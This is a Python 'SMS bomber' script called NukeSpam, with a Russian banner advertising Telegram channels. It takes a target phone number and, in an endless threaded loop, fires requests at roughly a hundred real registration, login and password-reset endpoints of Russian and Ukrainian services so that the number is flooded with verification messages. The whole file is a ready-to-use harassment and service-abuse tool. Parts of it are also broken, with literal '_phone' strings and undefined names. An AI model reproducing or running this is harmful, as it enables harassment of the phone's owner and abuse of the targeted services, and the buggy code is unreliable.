import requests
import random
import os
from threading import Thread
from colorama import Fore

os.system("clear")
print(Fore.CYAN + ''' 
ZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZ   ZZZZ  ZZZ        ZZZ
ZZZ    ZZZ  ZZZ  ZZZZZZZZZ
ZZZ  Z  ZZ  ZZZ  ZZZZZZZZZ
ZZZ  ZZ  Z  ZZZ        ZZZ
ZZZ  ZZZ    ZZZZZZZZZ  ZZZ
ZZZ  ZZZZ   ZZZZZZZZZ  ZZZ
ZZZ  ZZZZZ  ZZZ        ZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZ    NukeSpam v1.0   ZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZ Наш Telegram канал ZZZ
ZZ     t.me/pialhack    ZZ
Z                        Z
ZZ      Разработчик     ZZ
ZZZ    t.me/eToNuKTo   ZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZ
''')
phone = input(Fore.BLUE + '''Введите номер (+380, +7): ''')
threads = input(Fore.BLUE + '''Количество потоков: ''')
print(Fore.GREEN + '''Спам начинается! Чтобы остановить нажмите ctrl+Z''')
iteration = 0
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def infinity():
	while True:
		request_timeout = 0.00001
		_phone = phone
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] 
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			print(Fore.GREEN + '''{+} GrabTaxi Отправлено!''')
		except:
			print(Fore.RED + '''{-} GrabTaxi Не отправлено!''')

		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			print(Fore.GREEN + '''{+} RuTaxi Отправлено!''')
		except:
			print(Fore.RED + '''{-} RuTaxi Не отправлено!''')

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			print(Fore.GREEN + '''{+} BelkaCar Отправлено!''')
		except:
			print(Fore.RED + '''{-} BelkaCar Не отправлено!''')

		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			print(Fore.GREEN + '''{+} Tinkoff Отправлено!''')
		except:
			print(Fore.RED + '''{-} Tinkoff Не отправлено!''')

		try:
			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
			print(Fore.GREEN + '''{+} MTS TV Отправлено!''')
		except:
			print(Fore.RED + '''{-} MTS TV Не отправлено!''')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			print(Fore.GREEN + '''{+} Youla Отправлено!''')
		except:
			print(Fore.RED + '''{-} Youla Не отправлено!''')

		try:
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
			print(Fore.GREEN + '''{+} PizzaHut Отправлено!''')
		except:
			print(Fore.RED + '''{-} PizzaHut Не отправлено!''')

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
			print(Fore.GREEN + '''{+} Rabota.ru Отправлено!''')
		except:
			print(Fore.RED + '''{-} Rabota.ru Не отправлено!''')

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
			print(Fore.GREEN + '''{+} SMSINT Отправлено!''')
		except:
			print(Fore.RED + '''{-} SMSINT Не отправлено!''')
			
		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
			print(Fore.GREEN + '''{+} MVideo Отправлено!''')
		except:
			print(Fore.RED + '''{-} MVideo Не отправлено!''')

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			print(Fore.GREEN + '''{+} NewNext Отправлено!''')
		except:
			print(Fore.RED + '''{-} NewNext Не отправлено!''')

		try:
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
			print(Fore.GREEN + '''{+} SunLight Отправлено!''')
		except:
			print(Fore.RED + '''{-} SunLight Не отправлено!''')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': '_email', 'mobile_phone': '_phone', 'deliveryOption': 'sms'})
			print(Fore.GREEN + '''{+} ALPARI Отправлено!''')
		except:
			print(Fore.RED + '''{-} ALPARI Не отправлено!''')

		try:
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			print(Fore.GREEN + '''{+} INVITRO Отправлено!''')
		except:
			print(Fore.RED + '''{-} INVITRO Не отправлено!''')

		try:
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
			print(Fore.GREEN + '''{+} SBIS Отправлено!''')
		except:
			print(Fore.RED + '''{-} SBIS Не отправлено!''')

		try:
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			print(Fore.GREEN + '''{+} PSBank Отправлено!''')
		except:
			print(Fore.RED + '''{-} PSBank Не отправлено!''')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			print(Fore.GREEN + '''{+} BELTELECOM3 Отправлено!''')
		except:
			print(Fore.RED + '''{-} BELTELECOM3 Не отправлено!''')
			
		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
			print(Fore.GREEN + '''{+} KFC Отправлено!''')
		except:
			print(Fore.RED + '''{-} KFC Не отправлено!''')

		try:
			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
			print(Fore.GREEN + '''{+} CARSMAIL Отправлено!''')
		except:
			print(Fore.RED + '''{-} CARSMAIL Не отправлено!''')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
			print(Fore.GREEN + '''{+} CITILINK Отправлено!''')
		except:
			print(Fore.RED + '''{-} CITILINK Не отправлено!''')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
			print(Fore.GREEN + '''{+} DELIMOBILE Отправлено!''')
		except:
			print(Fore.RED + '''{-} DELIMOBILE Не отправлено!''')

		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
			print(Fore.GREEN + '''{+} FindClone Отправлено!''')
		except:
			print(Fore.RED + '''{-} FindClone Не отправлено!''')

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
			print(Fore.GREEN + '''{+} GuruTaxi Отправлено!''')
		except:
			print(Fore.RED + '''{-} GuruTaxi Не отправлено!''')

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			print(Fore.GREEN + '''{+} ICQ Отправлено!''')
		except:
			print(Fore.RED + '''{-} ICQ Не отправлено!''')

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
			print(Fore.GREEN + '''{+} INDTIVERAPP Отправлено!''')
		except:
			print(Fore.RED + '''{-} INDRIVERAPP Не отправлено!''')
			
		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
			print(Fore.GREEN + '''{+} Ivi.ru Отправлено!''')
		except:
			print(Fore.RED + '''{-} Ivi.ru Не отправлено!''')

		try:
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone':'_phone'})
			print(Fore.GREEN + '''{+} Lenta Отправлено!''')
		except:
			print(Fore.RED + '''{-} Lenta Не отправлено!''')

		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '_phone', 'api': 2, 'email': 'email','x-email': 'x-email'})
			print(Fore.GREEN + '''{+} Cloud.mail Отправлено!''')
		except:
			print(Fore.RED + '''{-} Cloud.mail Не отправлено!''')

		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			print(Fore.GREEN + '''{+} OK.RU Отправлено!''')
		except:
			print(Fore.RED + '''{-} OK.RU Не отправлено!''')
			
		try:
			requests.post("https://api.hmara.tv/stable/entrance", data={"contact": _phone})
			print(Fore.GREEN + '''{+} Hmara.TV Отправлено!''')
		except:		
			print(Fore.RED + '''{-} Hmara.TV Не отправлено!''')
			
		try:
			requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": _phone})
			print(Fore.GREEN + '''{+} Sushi-Master Отправлено!''')
		except:
			print(Fore.RED + '''{-} Sushi-Master Не отправлено!''')
			
		try:
			requests.post("https://msk.tele2.ru/api/validation/number", _phone, json={"sender": "Tele2"})
			print(Fore.GREEN + '''{+} Tele2 Отправлено!''')
		except:
			print(Fore.RED + '''{-} Tele2 Не отправлено!''')
		  
		try:
			requests.post("https://m.sportmaster.ru/user/session/SendSMSReg", params={"phone": _phone})
			print(Fore.GREEN + '''{+} SportMaster Отправлено!''')
		except:
			print(Fore.RED + '''{-} SportMaster Не отправлено!''')
		  
		try:
			requests.post("https://my.telegram.org/auth/send_password", data={"phone" :_phone})
			print(Fore.GREEN + '''{+} Telegram Отправлено!''')
		except:
		    print(Fore.RED + '''{-} Telegram Не отправлено!''')
		    
		try:
			requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone" :_phone})
			print(Fore.GREEN + '''{+} Finam.ru Отправлено!''')
		except:
			print(Fore.RED + '''{-} Finam.ru Не отправлено!''')
			
		try:
			requests.post("https://api.imgur.com/account/v1/phones/verify", data={"phone_number":"_phone","region_code":"RU"})
			print(Fore.GREEN + '''{+} Imgur Отправлено!''')
		except:
			print(Fore.RED + '''{-} Imgur Не отправлено!''')
		  
		try:
		  requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={'phone':'_phone'})
		  print(Fore.GREEN + '''{+} MonoBank Отправлено!''')
		except:
		  print(Fore.RED + '''{-} MonoBank Не отправлено!''')
		  
		try:
		   requests.post("https://account.my.games/signup_send_sms/", data={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} My Games Отправлено!''')
		except:
		   print(Fore.RED + '''{-} My Games Не отправлено!''')
		  
		try:
		   requests.post("https://www.moyo.ua/identity/registration", data={'phone':'_phone','firstname':'Иван','email':'mail@mail.com'})
		   print(Fore.GREEN + '''{+} Moyo Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Moyo Не отправлено!''')
		   
		try:
		   requests.post("https://secure.online.ua/ajax/check_phone?reg_phone=_phone")
		   print(Fore.GREEN + '''{+} Secure.online Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Secure.online Не отправлено!''')
		   
		try:
		   requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={'telephone':'_phone'})
		   print(Fore.GREEN + '''{+} PirogiNomerOdin Отправлено!''')
		except:
		   print(Fore.RED + '''{-} PirogiNomerOdin Не отправлено!''')
		   
		try:
		   requests.post("https://cabinet.planetakino.ua/service/sms?phone=_phone")
		   print(Fore.GREEN + '''{+} PlanetaKino Отправлено!''')
		except:
		   print(Fore.RED + '''{-} PlanetaKino Не отправлено!''')
		   
		try:
		   requests.post("https://pizzasinizza.ru/api/phoneCode.php", data={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} PizzaSinizza Отправлено!''')
		except:
		   print(Fore.RED + '''{-} PizzaSinizza Не отправлено!''')
		   
		try:
		   requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} RichFamily Отправлено!''')
		except:
		   print(Fore.RED + '''{-} RichFamily Не отправлено!''')
		   
		try:
		   requests.post("https://www.prosushi.ru/php/profile.php", data={'phone':'_phone','mode':'sms'})
		   print(Fore.GREEN + '''{+} ProSushi Отправленo!''')
		except:
		   print(Fore.RED + '''{-} ProSushi Не отправлено!''')
		   
		try:
		   requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={'demo_number':'_phone','ajax_demo_send':'1'})
		   print(Fore.GREEN + '''{+} SMS4b Отправлено!''')
		except:
		   print(Fore.RED + '''{-} SMS4b Не отправлено!''')
		   
		try:
		   requests.post("https://kasta.ua/api/v2/login/", data={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} Kasta Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Kasta Не отправлено!''')
		   
		try:
		   requests.post("https://app.benzuber.ru/login", data={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} Benzuber Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Benzuber Не отправлено!''')
		   
		try:
		   requests.post("https://bamper.by/registration/?step=1", data={'phone': '_phone', 'submit': 'Запросить смс подтверждения', 'rules': 'on'})
		   print(Fore.GREEN + '''{+} Bamper Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Bamper Не отправлено!''')
		   
		try:
		   requests.post("https://eda.yandex/api/v1/user/request_authentication_code", data={'phone_number':'_phone'})
		   print(Fore.GREEN + '''{+} Yandex Eda Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Yandex Eda Не отправлено!''')
		   
		try:
		   requests.post("https://api.chef.yandex/api/v2/auth/sms", data={'phone_number':'+_phone'})
		   print(Fore.GREEN + '''{+} Yandex Chef Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Yandex Chef Не отправлено!''')
		   
		try:
		   requests.post("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone=_phone&callmode=1&oper=9")
		   print(Fore.GREEN + '''{+} Sipnet Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Sipnet Не отправлено!''')
		   
		try:
		   requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data={'phone':'_phone','otpId':0})
		   print(Fore.GREEN + '''{+} Ozon Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Ozon Не отправлено!''')
		   
		try:
		   requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={'phone_number':'_phone'})
		   print(Fore.GREEN + '''{+} Tinder Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Tinder Не отправлено!''')
		   
		try:
		   requests.post("https://city24.ua/personalaccount/account/registration", data={'PhoneNumber':'_phone'})
		   print(Fore.GREEN + '''{+} City24 Отправлено!''')
		except:
		   print(Fore.RED + '''{-} City24 Не отправлено!''')
		   
		try:
		   requests.post("https://auth.multiplex.ua/login", json={'login':'_phone'})
		   print(Fore.GREEN + '''{+} Multiplex Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Multiplex Не отправлено!''')
		   
		try:
		   requests.post("https://yaponchik.net/login/login.php", data={'login': 'Y','countdown': '0','step': '_phone','redirect': '/profile/','phone':'_phone', 'code':''})
		   print(Fore.GREEN + '''{+} Yaponchik Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Yaponchik Не отправлено!''')
		   
		try:
		   requests.post("https://api.iconjob.co/api/auth/verification_code",json={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} IconJob Отправлено!''')
		except:
		   print(Fore.RED + '''{-} IconJob Не отправлено!''')
		   
		try:
		   requests.post("https://ng-api.webbankir.com/user/v2/create", json={'lastName':'Луманов','firstName':'Сергей','middleName':'Иванович',"mobilePhone":'_phone',"email":'_email','smsCode':''})
		   print(Fore.GREEN + '''{+} WebBankir Отправлено!''')
		except:
		   print(Fore.RED + '''{-} WebBankir Не отправлено!''')
		   
		try:
		   requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} Shop vsk Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Shop vsk Не отправлено!''')
		   
		try:
		   requests.post("https://thehive.pro/auth/signup", json={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} Thehive Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Thehive Не отправлено!''')
		   
		try:
		   requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php", data={'RECALL': 'Y', 'BACK_CALL_PHONE': _phone})
		   print(Fore.GREEN + '''{+} Taxi-Ritm Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Taxi-Ritm Не отправлено!''')
		   
		try:
		   requests.post("https://lk.tabris.ru/reg/", data={'action':'phone', 'phone': _phone})
		   print(Fore.GREEN + '''{+} Tabris Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Tabris Не отправлено!''')
		   
		try:
		   requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": _phone})
		   print(Fore.GREEN + '''{+} Suandshi Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Suandshi Не отправлено!''')
		   
		try:
		   requests.post("https://alfalife.cc/auth.php", data={'phone': _phone})
		   print(Fore.GREEN + '''{+} AlfaLife Отправлено!''')
		except:
		   print(Fore.RED + '''{-} AlfaLife Не отправлено!''')
		   
		try:
		   requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": _phone, 'resend': 0})
		   print(Fore.GREEN + '''{+} Shop And Show Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Shop And Show Не отправлено!''')
		   
		try:
		   requests.post("https://pizzakazan.com/auth/ajax.php", data={'phone': _phone, 'method': 'sendCode'})
		   print(Fore.GREEN + '''{+} PizzaKazan Отправлено!''')
		except:
		   print(Fore.RED + '''{-} PizzaKazan Не отправлено!''')
		   
		try:
		   requests.post('https://plink.tech/register/',json={'phone': _phone})
		   print(Fore.GREEN + '''{+} Plink отправлено!''')
		except:
		   print(Fore.RED + '''{-} Plink Не отправлено!''')
		   
		try:
		   requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={'phone': _phone})
		   print(Fore.GREEN + '''{+} qlean отправлено!''')
		except:
		   print(Fore.RED + '''{-} qlean Не отправлено!''')
		   
		try:
		   requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		   print(Fore.GREEN + '''{+} SMSgorod отправлено!''')
		except:
		   print(Fore.RED + '''{-} SMSgorod Не отправлено!''')
		   
		try:
		   requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		   print(Fore.GREEN + '''{+} Twitch отправлено!''')
		except:
		   print(Fore.RED + '''{-} Twich Не отправлено!''')
		
		try:
		   requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		   print(Fore.GREEN + '''{+} Wowworks отправлено!''')
		except:
		   print(Fore.RED + '''{-} Wowworks Не отправлено!''')
		   
		try:
		   requests.post("https://www.delivery-club.ru/ajax/user_otp", data={"phone": _phone})
		   print(Fore.GREEN + '''{+} Delivery отправлено!''')
		except:
		   print(Fore.RED + '''{-} Delivery Не отправлено!''')
		   
		try:
		   requests.post("https://mobileplanet.ua/register", data={"klient_name": name,"klient_phone": _phone,"klient_email": _email})
		   print(Fore.GREN + '''{+} MobilePlanet Отправлено!''')
		except:
		   print(Fore.RED + '''{-} MobilePlanet Не отправлено!''')
		   
		try:
		   requests.post("https://pampik.com/callback", data={'phoneCallback':'_phone'})
		   print(Fore.GREEN + '''{+} Pampik Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Pampik Не отправлено!''')
		   
		try:
		   requests.post("https://my.dianet.com.ua/send_sms/", data={'phone':'_phone'})
		   print(Fore.GREEN + '''{+} Dianet Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Dianet Не отправлено!''')
		   
		try:
		   requests.post("https://api.easypay.ua/api/auth/register", data={'phone':'_phone','password':'_password'})
		   print(Fore.GREEN + '''{+} EazyPay Отправлено!''')
		except:
		   print(Fore.RED + '''{-} EazyPay Не отправлено!''')
		   
		try:
		   requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={'phone':'_phone_','action':'getCode','register_call':'Y'})
		   print(Fore.GREEN + '''{+} Fix-Price Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Fix-Price Не отправлено!''')
		   
		try:
		   requests.post("https://foodband.ru/api?phone=_phone&call=customers/sendVerificationCode&g-recaptcha-response=")
		   print(Fore.GREEN + '''{+} FoodBamd Отправлено!''')
		except:
		   print(Fore.RED + '''{-} FoodBand Не отправлено!''')
		   
		try:
		   requests.post("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number=_phone")
		   print(Fore.GREEN + '''{+} oapi Отправлено!''')
		except:
		   print(Fore.RED + '''{-} oapi Не отправлено!''')
		   
		try:
		   requests.post("https://rieltor.ua/api/users/register-sms/", data={'phone':'%phone%','retry':0})
		   print(Fore.GREEN + '''{+} Rieltor Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Rieltor Не отправлено!''')
		   
		try:
		   requests.post("https://vezitaxi.com/api/employment/getsmscode?phone=+_phone&city=561&callback=jsonp_callback_35979")
		   print(Fore.GREEN + '''{+} VeziTaxi Отправлено!''')
		except:
		   print(Fore.RED + '''{-} VeziTaxi Не отправлено!''')
		   
		try:
		   requests.post("https://tehnosvit.ua/iwantring_feedback.html", data={'feedbackName':'%name%','feedbackPhone':'_phone'})
		   print(Fore.GREEN + '''{+} TehnoSvit Отправлено!''')
		except:
		   print(Fore.RED + '''{-} TehnoSvit Не отправлено!''')
		   
		try:
		   requests.post("https://my.citrus.ua/api/v2/register", data={'email':'email','name':'_name','phone':'_phone','password':'!@#qwe','confirm_passwor':'!@#qwe'})
		   print(Fore.GREEN + '''{+} Citrus Отправлено!''')
		except:
		   print(Fore.RED + '''{-} Citrus Не отправлено!''')
		   
threads = Thread(target=infinity)
threads.start()